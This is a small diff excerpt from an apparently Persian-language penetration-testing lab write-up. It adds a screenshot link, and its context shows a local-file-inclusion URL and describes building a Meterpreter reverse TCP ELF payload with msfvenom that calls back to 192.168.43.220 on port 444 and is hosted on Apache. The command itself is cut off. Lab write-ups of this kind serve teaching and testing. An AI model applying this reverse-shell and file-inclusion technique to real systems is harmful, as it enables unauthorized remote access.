@@ -123,6 +123,8 @@ http://192.168.43.200/view.php?page=../../usr/databases/ls.php
 
 ## ۱۰. ساخت و میزبانی Payload متِرپرتر
 
+![تصویر ۱۰: ساخت payload متِرپرتر و اجرای Apache](screenshots/10.png)
+
 پس از آزمایش قبلی، با استفاده از ابزار `msfvenom` یک payload از نوع Meterpreter Reverse TCP برای لینوکس با معماری x86 ساختم. آدرس برگشت به ماشین کالی با IP برابر `192.168.43.220` و پورت `444` تنظیم شد و فایل خروجی با فرمت ELF و نام `IM_HERE` در مسیر ریشه وب‌سرور Apache ذخیره شد:
 
 ```bash
